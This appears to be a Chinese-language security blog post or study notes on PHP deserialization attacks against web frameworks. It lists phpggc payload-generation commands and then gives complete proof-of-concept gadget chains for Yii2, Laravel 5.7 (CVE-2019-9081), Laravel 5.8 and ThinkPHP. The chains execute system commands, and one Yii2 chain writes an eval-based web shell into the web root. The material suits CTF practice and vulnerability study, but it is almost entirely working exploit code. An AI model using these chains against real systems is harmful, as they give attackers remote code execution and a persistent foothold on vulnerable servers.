---
title: php框架反序列化
date: 2023-08-11 20:13:25
categories:
- 网络安全
tags:
- web 
description: |
    php框架反序列化
---

## 一些框架序列化问题

工具：`phpggc`
`./phpggc -l` 查看支持的框架
`./phpggc -l laravel` 查看laravel支持的反序列化方式
`./phpggc -i symfony/rce1`查看详细信息
`./phpggc Symfony/RCE1 id` Command
`./phpggc Symfony/RCE2 'phpinfo();'` PHP code
`./phpggc Symfony/RCE4 system id` Function call
`./phpggc <gadget-chain> [parameters]` 生成payload
`./phpggc monolog/rce1 assert 'phpinfo()'` 生成payload

参数可以修改载荷的输出方式。例如，`-u`会对其进行 URL 编码，`-b`会将其转换为 `base64`。载荷通常包含 `NULL` 字节，因此不能按原样复制/粘贴。使用 `-s` 进行软 `URL` 编码，这使得载荷保持可读性。

### Yii2反序列化

```php
//poc1
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'ls';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            $this->formatters['close'] = [new CreateAction(), 'run'];
        }
    }
}

namespace yii\db{
    use Faker\Generator;

    class BatchQueryResult{
        private $_dataReader;

        public function __construct(){
            $this->_dataReader = new Generator;
        }
    }
}
namespace{
    echo base64_encode(serialize(new yii\db\BatchQueryResult));
}
?>
```

```php
//poc2
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'ls';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            // 这里需要改为isRunning
            $this->formatters['isRunning'] = [new CreateAction(), 'run'];
        }
    }
}

// poc2
namespace Codeception\Extension{
    use Faker\Generator;
    class RunProcess{
        private $processes;
        public function __construct()
        {
            $this->processes = [new Generator()];
        }
    }
}
namespace{
    // 生成poc
    echo base64_encode(serialize(new Codeception\Extension\RunProcess()));
}
?>
```

```php
//poc3
<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'ls';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            // 这里需要改为isRunning
            $this->formatters['render'] = [new CreateAction(), 'run'];
        }
    }
}

namespace phpDocumentor\Reflection\DocBlock\Tags{

    use Faker\Generator;

    class See{
        protected $description;
        public function __construct()
        {
            $this->description = new Generator();
        }
    }
}
namespace{
    use phpDocumentor\Reflection\DocBlock\Tags\See;
    class Swift_KeyCache_DiskKeyCache{
        private $keys = [];
        private $path;
        public function __construct()
        {
            $this->path = new See;
            $this->keys = array(
                "axin"=>array("is"=>"handsome")
            );
        }
    }
    // 生成poc
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));
}
?>
```

```php
//poc4
<?php
namespace yii\rest {
    class Action
    {
        public $checkAccess;
    }
    class IndexAction
    {
        public function __construct($func, $param)
        {
            $this->checkAccess = $func;
            $this->id = $param;
        }
    }
}
namespace yii\web {
    abstract class MultiFieldSession
    {
        public $writeCallback;
    }
    class DbSession extends MultiFieldSession
    {
        public function __construct($func, $param)
        {
            $this->writeCallback = [new \yii\rest\IndexAction($func, $param), "run"];
        }
    }
}
namespace yii\db {
    use yii\base\BaseObject;
    class BatchQueryResult
    {
        private $_dataReader;
        public function __construct($func, $param)
        {
            $this->_dataReader = new \yii\web\DbSession($func, $param);
        }
    }
}
namespace {
    $exp = new \yii\db\BatchQueryResult('shell_exec', "echo '<?php eval(\$_POST[1]);phpinfo();?>' > /var/www/html/basic/web/1.php ");
    // Yii2框架路径
    echo(base64_encode(serialize($exp)));
}
```

### laravel反序列化

#### 5.7

```php
//poc1
//laravelv5.7反序列化rce(CVE-2019-9081)
<?php
 
namespace Illuminate\Foundation\Testing {
    class PendingCommand
    {
        public $test;
        protected $app;
        protected $command;
        protected $parameters;
 
        public function __construct($test, $app, $command, $parameters)
        {
            $this->test = $test;                 //一个实例化的类 Illuminate\Auth\GenericUser
            $this->app = $app;                   //一个实例化的类 Illuminate\Foundation\Application
            $this->command = $command;           //要执行的php函数 system
            $this->parameters = $parameters;     //要执行的php函数的参数  array('id')
        }
    }
}
 
namespace Faker {
    class DefaultGenerator
    {
        protected $default;
 
        public function __construct($default = null)
        {
            $this->default = $default;
        }
    }
}
 
namespace Illuminate\Foundation {
    class Application
    {
        protected $instances = [];
 
        public function __construct($instances = [])
        {
            $this->instances['Illuminate\Contracts\Console\Kernel'] = $instances;
        }
    }
}
 
namespace {
    $defaultgenerator = new Faker\DefaultGenerator(array("hello" => "world"));
 
    $app = new Illuminate\Foundation\Application();
 
    $application = new Illuminate\Foundation\Application($app);
 
    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, 'system', array('cat /flag'));
 
    echo urlencode(serialize($pendingcommand));
}
```

#### 5.8

```php
<?php
namespace PhpParser\Node\Scalar\MagicConst{
    class Line {}
}
namespace Mockery\Generator{
    class MockDefinition
    {
        protected $config;
        protected $code;

        public function __construct($config, $code)
        {
            $this->config = $config;
            $this->code = $code;
        }
    }
}
namespace Mockery\Loader{
    class EvalLoader{}
}
namespace Illuminate\Bus{
    class Dispatcher
    {
        protected $queueResolver;
        public function __construct($queueResolver)
        {
            $this->queueResolver = $queueResolver;
        }
    }
}
namespace Illuminate\Foundation\Console{
    class QueuedCommand
    {
        public $connection;
        public function __construct($connection)
        {
            $this->connection = $connection;
        }
    }
}
namespace Illuminate\Broadcasting{
    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}
namespace{
    $line = new PhpParser\Node\Scalar\MagicConst\Line();
    $mockdefinition = new Mockery\Generator\MockDefinition($line,"<?php system('cat /f*');exit;?>");
    $evalloader = new Mockery\Loader\EvalLoader();
    $dispatcher = new Illuminate\Bus\Dispatcher(array($evalloader,'load'));
    $queuedcommand = new Illuminate\Foundation\Console\QueuedCommand($mockdefinition);
    $pendingbroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispatcher,$queuedcommand);
    echo urlencode(serialize($pendingbroadcast));
}
?>
```

### thinkphp反序列化

```php
<?php
namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this->append = ["lin"=>["calc.exe","calc"]];
        $this->data = ["lin"=>new Request()];
    }
}
class Request
{
    protected $hook = [];
    protected $filter = "system";
    protected $config = [
        // 表单ajax伪装变量
        'var_ajax'         => '_ajax',  
    ];
    function __construct(){
        $this->filter = "system";
        $this->config = ["var_ajax"=>'lin'];
        $this->hook = ["visible"=>[$this,"isAjax"]];
    }
}


namespace think\process\pipes;

use think\model\concern\Conversion;
use think\model\Pivot;
class Windows
{
    private $files = [];

    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
namespace think\model;

use think\Model;

class Pivot extends Model
{
}
use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?>
```
